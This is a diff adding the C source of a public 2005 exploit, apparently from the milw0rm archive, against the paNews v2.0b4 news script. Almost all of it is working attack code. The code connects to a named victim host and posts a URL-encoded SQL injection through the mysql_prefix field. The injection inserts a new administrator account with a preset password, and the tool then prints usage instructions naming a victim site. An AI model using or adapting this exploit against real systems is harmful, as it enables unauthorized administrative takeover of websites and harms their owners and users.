@@ -1,0 +1,159 @@
+/***************************************************
+*                                                  *
+* paNews v2.0b4                                    *
+*                                                  *
+* silePNEWSxpl                                     *
+* This exploit utilize SQL injection for create    *
+* a new user with admin privileges on paNews       *
+* software system.                                 *
+*                                                  *
+* References:                                      *
+* packetstormsecurity.org/0503-exploits/panews.txt *
+                         *
+*                                                  *
+* coded by: Silentium of Anacron Group Italy       *
+*     date: 04/03/2005                             *
+*   e-mail: anacrongroupitaly[at]autistici[dot]org *
+*  my_home: www.autistici.org/anacron-group-italy  *
+*                                                  *
+* this tool is developed under GPL license         *
+* no(c) .:. copyleft                               *
+*                                                  *
+***************************************************/
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <netdb.h>
+
+#define PORT 80                 // port of the web server
+
+void info(void);
+void sendxpl(int sock, char *argv[]);
+void errsock(void);
+void errgeth(void);
+void errconn(void);
+
+int main(int argc, char *argv[]){
+
+int sock, sockconn;
+struct sockaddr_in addr;
+struct hostent *hp;
+
+if(argc!=4)
+  info();
+
+if((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0)
+  errsock();
+
+system("clear");
+printf("[*] Creating socket             [OK]\n");
+
+if((hp = gethostbyname(argv[1])) == NULL)
+  errgeth();
+
+printf("[*] Resolving victim host       [OK]\n");
+
+memset(&addr,0,sizeof(addr));
+memcpy((char *)&addr.sin_addr,hp->h_addr,hp->h_length);
+addr.sin_family = AF_INET;
+addr.sin_port = htons(PORT);
+
+sockconn = connect(sock,(struct sockaddr *)&addr,sizeof(addr));
+if(sockconn < 0)
+  errsock();
+
+printf("[*] Connecting at victim host   [OK]\n");
+
+sendxpl(sock, argv);
+
+printf("[*] Now check on\n"
+      "    http://%s%s\n\n"
+      "    your username: %s\n"
+      "    with password: anacron\n\n",argv[1],argv[2],argv[3]);
+
+shutdown(sock, 2);
+close(sock);
+
+return(0);
+
+}
+
+void info(void){
+
+system("clear");
+printf("#########################################\n"
+      "# paNews v2.0b4 exploit                 #\n"
+      "#########################################\n"
+      "# this exploit create a new user admin  #\n"
+      "# on paNews software system.            #\n"
+      "# exploit coded by Silentium            #\n"
+      "# Anacron Group Italy                   #\n"
+      "# www.autistici.org/anacron-group-italy #\n"
+      "#########################################\n\n"
+      "[usage]\n\n"
+      " silePNEWSxpl <victim> <path_paNews> <username>\n\n"
+      "[example]\n\n"
+      " silePNEWSxpl www.victim.com /panews/index.php silentium\n\n");
+exit(1);
+
+}
+
+void sendxpl(int sock, char *argv[]){
+
+FILE *out;
+int size = 264;
+out = fdopen(sock,"a");
+setbuf(out,NULL);
+
+size+=(strlen(argv[3]) * 2);
+
+fprintf(out,"POST %s HTTP/1.0\n"
+           "Connection: Keep-Alive\n"
+           "Pragma: no-cache\n"
+           "Cache-control: no-cache\n"
+           "Accept: text/html, image/jpeg, image/png, text/*, image/*, */*\n"
+           "Accept-Encoding: x-gzip, x-deflate, gzip, deflate, identity\n"
+           "Accept-Charset: iso-8859-1, utf-8;q=0.5, *;q=0.5\n"
+           "Accept-Language: en\n"
+           "Host: %s\n"
+           "Referer: http://%s%s\n"
+           "Content-Type: application/x-www-form-urlencoded\n"
+           "Content-Length: %d\n\n"
+           "action%%3Dlogin%%26username%%3D%s%%26password%%3Danacron%%26"
+           "mysql_prefix%%3Dpanews_auth%%60%%20VALUES%%20(%%22%%22,%%22"
+           "%s%%22,%%22f63140655b379e65f6cd87fa3c3da631%%22,%%22"
+           "hackit%%22,%%22admins%%7Ccat%%7Ccomment%%7Cnewsadd%%7Cnewsedit"
+           "%%7Cprefset%%7Csetup%%22,%%22none%%22,%%22127.0.0.1%%22"
+           ",1,1)%%00\n\n",argv[2],argv[1],argv[1],argv[2],size,argv[3],argv[3]);
+
+           printf("[*] Sending exploit         [OK]\n\n");
+
+}
+
+void errsock(void){
+
+system("clear");
+printf("[x] Creating socket             [FAILED]\n\n");
+exit(1);
+
+}
+
+void errgeth(void){
+
+printf("[x] Resolving victim host        [FAILED]\n\n");
+exit(1);
+
+}
+
+void errconn(void){
+
+printf("[x] Connecting at victim host    [FAILED]\n\n");
+exit(1);
+
+}
+
+// milw0rm.com [2005-03-08]
